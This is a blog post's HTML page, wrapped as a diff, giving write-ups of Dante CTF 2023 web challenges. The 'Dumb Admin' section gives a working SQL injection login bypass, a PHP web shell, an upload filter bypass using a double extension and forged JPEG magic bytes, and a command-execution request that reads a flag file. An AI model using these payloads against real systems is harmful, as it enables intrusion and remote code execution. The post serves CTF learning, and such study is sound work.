@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+    <title>
+Dante CTF Writeups - Web | Niccolò Parlanti
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="generator" content="Hugo 0.92.2" />
+
+
+<link rel="canonical" href="http://Niccolo10.github.io/writeups/dante_ctf_2023_web/" >
+<link href="/sass/main.min.a8be33730f01e46b6e968a84ed6b211a9d1286d34f7e143c012da9c14cd56400.css" rel="stylesheet">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NHDH4QVJC1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-NHDH4QVJC1');
+</script>
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a href="http://Niccolo10.github.io/">
+                <span class="terminal">niccoloparlanti@cybersec ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu"/>
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="http://Niccolo10.github.io/projects" title="" >
+                        ~/projects</a>
+                </li>
+                
+                <li>
+                    <a href="http://Niccolo10.github.io/writeups" title="" >
+                        ~/writeups</a>
+                </li>
+                
+                <li>
+                    <a href="http://Niccolo10.github.io/about" title="" >
+                        ~/about</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Dante CTF Writeups - Web</h1>
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/ctf/">#CTF</a><span></span>
+    <a href="/tags/web/">#Web</a><span></span>
+    <a href="/tags/dante-ctf-2023/">#Dante-CTF-2023</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2023-06-05">June 5, 2023</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>5 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <p>Writeups of the Dante CTF 2023 - WEB</p>
+<p> </p>
+<h1 id="web">WEB</h1>
+<h2 id="unknown-site-1">Unknown Site 1</h2>
+<p>🏆 Challenge Description</p>
+<p><em>Just a web warmup challenge to keep the bots away. Enjoy it.</em></p>
+<hr>
+<p><img src="/images/site1.png" alt="Unknown site main page"></p>
+<p>The page shows an image. The image refers to Google and shows a robot as a hint. Robots file is very important for a search engine. It is a file located on a server which indicates which file the search engine can show on the internet and can access to in order to crawl and collect info about the website.</p>
+<p>🏁 <!-- raw HTML omitted -->DANTE{Yo0_Must_B3_A_R0boTtTtTtTTtTAD6182_0991847}<!-- raw HTML omitted --></p>
+<p> </p>
+<p> </p>
+<h2 id="unknown-site-2">Unknown Site 2</h2>
+<p>🏆 Challenge Description</p>
+<p><em>Now that you completed the Warmup, you need to get the hidden second flag on the same site.</em></p>
+<hr>
+<p>After completing the challenge above, <strong>Unknown Site 1</strong>, we can see some more info in the file <code>robots.txt</code>:</p>
+<ul>
+<li>The first flag</li>
+<li>Some other directories</li>
+</ul>
+<p>Visiting the first directory (<code>s3cretDirectory1</code>) gives us the following result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Hello There User!
+</code></pre></div><p>Poking around with headers we can find a cookie named <code>FLAG</code> with value <code>NOPE</code>. Trying to access <code>s3cretDirectory2</code> gives us a similar result. Visiting <code>s3cretDirectory3</code> instead, returns a list of <code>php</code> pages saved in that directory.</p>
+<p>Example:</p>
+<pre tabindex="0"><code>0aI4CRUqFVn5vTWQsoNZhFvKcGg7i6e3.php
+0akStEOWq118z6EroRWoLIdAJ2gRntAa.php
+0BmZPSmQaQ4AoYsKhDdH3U5B47dRQKqf.php
+0BRUlCClTlqglOMCcfI8ehGd5u2dY8x8.php
+0D33rdk9NREOX1raB4AJLyQicNqhROI7.php
+0gUxhSv85tdnmcjbjxMkotMUE3Eq8s3h.php
+00i8HTSHh9okcnuoIrIxErhAjSe1gKQa.php
+0IUOyATG24VDSpHI9PNxQGJrz8iqaINl.php
+0Jc7BSRx6Is10vu0oCrjn9D99kfM6MjI.php
+</code></pre><p>Clicking on pages, you will get always the same result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Hello There User!
+</code></pre></div><p>And the cookie with name <code>FLAG</code> value <code>NOPE</code> is still present. The solution is to write a small script to crawl all the <code>PHP</code> files and check all the <code>FLAG</code> cookies in order to get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests <span style="color:#66d9ef">as</span> r
+<span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
+<span style="color:#f92672">import</span> re
+
+response <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://localhost:5757/s3cretDirectory3/&#39;</span>)
+soup <span style="color:#f92672">=</span> BeautifulSoup(response<span style="color:#f92672">.</span>text, features<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html.parser&#34;</span>)
+
+<span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> soup<span style="color:#f92672">.</span>find_all(<span style="color:#e6db74">&#39;a&#39;</span>, href<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
+    <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">&#34;[a-zA-Z0-9]</span><span style="color:#e6db74">{32}</span><span style="color:#e6db74">&#34;</span>, a[<span style="color:#e6db74">&#39;href&#39;</span>]):
+        request2 <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://localhost:5757/s3cretDirectory3/&#39;</span> <span style="color:#f92672">+</span> a[<span style="color:#e6db74">&#39;href&#39;</span>])
+        <span style="color:#66d9ef">if</span> a[<span style="color:#e6db74">&#39;href&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;index.php&#34;</span> <span style="color:#f92672">and</span> request2<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get_dict()[<span style="color:#e6db74">&#39;FLAG&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;NOPE&#34;</span>:
+            print(<span style="color:#e6db74">&#34;Found flag in page: &#34;</span> <span style="color:#f92672">+</span> a[<span style="color:#e6db74">&#39;href&#39;</span>])
+            print(request2<span style="color:#f92672">.</span>cookies<span style="color:#f92672">.</span>get_dict())
+            <span style="color:#66d9ef">break</span>
+</code></pre></div><p>🏁 <!-- raw HTML omitted -->DANTE{Rand0m_R3al_C00ki3_000912_24}<!-- raw HTML omitted --></p>
+<p> </p>
+<p> </p>
+<h2 id="dante-barber-shop">Dante Barber Shop</h2>
+<p>🏆 Challenge Description</p>
+<p>Welcome to our renowned barber shop!
+Your task, should you choose to accept it, is to uncover hidden information and retrieve the sensitive data that the owners may have left around.</p>
+<hr>
+<!-- raw HTML omitted -->
+<p>To begin, you’ll need to navigate through the website and explore the various pages. Pay close attention to the details provided, as they may contain clues or hidden information. In particular, the challenge hints that the credentials can be found in the <code>barber1.jpg</code> image.</p>
+<!-- raw HTML omitted -->
+<p>Once you’ve successfully discovered the credentials hidden within the <code>barber1.jpg</code> image, you can proceed to the login page. Use the obtained username and password to log in as a barber user. You will be granted access to the admin page, where you can perform further actions.</p>
+<!-- raw HTML omitted -->
+<p> </p>
+<p> </p>
+<h2 id="dumb-admin">Dumb Admin</h2>
+<p>🏆 Challenge Description</p>
+<p>The Admin coded his dashboard by himself. He’s sure to be a pro coder and he’s so satisfied about it. Can you make him rethink that?</p>
+<hr>
+<p><img src="/images/login.png" alt="Dumb Admin main page"></p>
+<p>We’re prompted on an admin panel login. The first thing you should try on an input is to attempt a SQL Injection especially on Admin panels because the first row in the database will most probably be the row which contains admin info such as username, password &hellip; For now we can try to access by typing something random:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">username: admin
+password: admin
+</code></pre></div><p>What we get from the page is: <code>Invalid password format</code>. So for some reason we need to put a more secure password in the login too, we will proceed by using as password <code>Som3PasswoRd3%</code>.</p>
+<p>Trying:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">username: admin
+password: Som3PasswoRd3%
+</code></pre></div><p>we get <code>Username or password wrong</code>.</p>
+<p>So let’s try to inject something like <code>'</code> in the username to interrupt an SQL Syntax of a query.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">username: &#39;
+password: Som3PasswoRd3%
+</code></pre></div><p>What we get is a strange error:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">SQLite3</span><span style="color:#f92672">::</span><span style="color:#a6e22e">query</span>()<span style="color:#f92672">:</span> <span style="color:#a6e22e">Unable</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">prepare</span> <span style="color:#a6e22e">statement</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">near</span> <span style="color:#e6db74">&#34;&#39; AND password = &#39;&#34;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">syntax</span> <span style="color:#a6e22e">error</span>
+</code></pre></div><p>This seems to be a classical error for a SQL injection.</p>
+<p>If instead we try to inject a good query adding a comment too:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">username: &#39; -- comment
+password: Som3PasswoRd3%
+</code></pre></div><p>This time we get again Username or password wrong.
+We can try to inject the most basic kind of SQL injection known which is ' or 1=1 &ndash; comment (Logic SQL injection) to let the backend retrieve the administrator’s row since admin is often the first registered user in a database.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">username: &#39; or 1=1 -- comment
+password: Som3PasswoRd3%
+</code></pre></div><p><img src="/images/admin.png" alt="Admin dashboard"></p>
+<p>The page allows us to upload an image. The first thing to do is to please the form and upload an image within (2 KB).
+Take a small screenshot of something of a few bytes and try to upload it.</p>
+<p>What we got is a generated hash with my file extension:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">The image 7b44dc6bbcfb8d457453656ae33181d7.png has been uploaded!
+You can view it here: Click here
+</code></pre></div><p>Clicking the link we can see the image:</p>
+<p><img src="/images/image.png" alt="Image upload"></p>
+<p>By clicking it, we can see the image rendered by the browser since we’re accessing it directly.</p>
+<p>So this must be a way to execute something that we can upload with the previous image form.</p>
+<p>Since we’re working with PHP (you can clearly see it from link extensions, for example: dashboard.php), we can build a PHP script to execute some code on the remote server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>and we save it in a file called shell.php.</p>
+<p>Let’s try to upload it.</p>
+<p>An error occurs:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">The extension &#39;.php&#39; indicate it is not an image!
+</code></pre></div><p>There is a check on the file extension.
+The most basic bypass for an extension is to add a fake extension and appending .php extension anyway. You can find some payloads here: <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</a>.</p>
+<p>Let’s try to modify the name of the file from shell.php to shell.png.php.
+It seems to work, since we get a different error from the page:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Uploaded file seems to be not a real image!
+</code></pre></div><p>After a bit of research, you can notice a strange response header that is set:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Magic-Function-Used-By-The-Page: exif_imagetype
+</code></pre></div><p>This is a tip about what backend is running. Let’s take a look at what exif_imagetype is. From the PHP manual <a href="https://www.php.net/manual/en/function.exif-imagetype.php">https://www.php.net/manual/en/function.exif-imagetype.php</a>, we can get some info.<br>
+<code>exif_imagetype() reads the first bytes of an image and checks its signature.</code></p>
+<p>So if such a built-in function is used, we can easily bypass it by adding some Magic bytes at the beginning of our file shell.png.php. Of course, we will still try to inject PHP code to achieve an RCE.
+To do so, we can build a simple python script that does the work:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">outputFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;shell.png.php&#34;</span>
+
+shell <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;</span>
+
+<span style="color:#66d9ef">with</span> open(outputFile,<span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#34;</span>)
+    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd8</span><span style="color:#e6db74">&#34;</span>)
+    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#34;</span>)
+    f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xee</span><span style="color:#e6db74">&#34;</span>)
+    f<span style="color:#f92672">.</span>write(shell)
+
+print(<span style="color:#e6db74">&#34;Content of the exported file: &#34;</span>)
+
+lines <span style="color:#f92672">=</span> []
+<span style="color:#66d9ef">with</span> open(outputFile,<span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+    lines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+
+print(lines)
+
+</code></pre></div><p>ffd8ffee are the first bytes in a jpg image. Now finally we can try to upload the file again.</p>
+<p>And here we go!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">The image 826eca1e5af937d67e30584b422f8d12.png.php has been uploaded!
+You can view it here: Click here
+
+</code></pre></div><p>Clicking the link, we can do the same thing as before and access the direct link of the uploaded PHP file.
+In my case, it is urlbefore&hellip;/f9bbbecb61014db8f0674bf60c27e668/826eca1e5af937d67e30584b422f8d12.png.php.</p>
+<p>Now we can finally get the flag by requesting the page with a GET parameter set as cmd, to retrieve the flag executing a cat.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.../f9bbbecb61014db8f0674bf60c27e668/826eca1e5af937d67e30584b422f8d12.png.php?cmd<span style="color:#f92672">=</span>cat+/flag.txt
+</code></pre></div><p>🏁 <!-- raw HTML omitted -->DANTE{Y0u_Kn0w_how_t0_bypass_things_in_PhP9Abd7BdCFF}<!-- raw HTML omitted --></p>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2023 Niccolò Parlanti | Download my 
+            <a href="http://Niccolo10.github.io/docs/CV_nc.pdf" target="_blank">Resume</a>
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
